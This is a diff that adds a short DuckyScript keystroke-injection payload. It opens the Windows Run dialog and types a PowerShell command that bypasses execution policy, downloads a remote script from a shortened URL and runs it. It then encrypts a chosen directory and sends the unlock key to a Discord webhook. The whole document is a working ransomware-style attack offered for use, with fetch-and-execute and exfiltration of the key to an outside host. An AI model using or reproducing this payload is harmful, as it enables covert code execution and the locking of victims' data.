@@ -1,0 +1,13 @@
+REM WARNING!!! this script will encrypt whatever path you provide!! USE WITH CAUTION!
+
+REM this script encrypts a path you pass to it and sends the key to unlock the directory to discord webhook
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -NoP -Ep Bypass irm "t.ly/MEA1y"|iex; E-D -e -p "PATH/TO/DIRECTORY" -wh "YOUR WEBHOOK"
+DELAY 1000
+ENTER
+
+
+REM to decrypt, use DecryptDiscord.txt
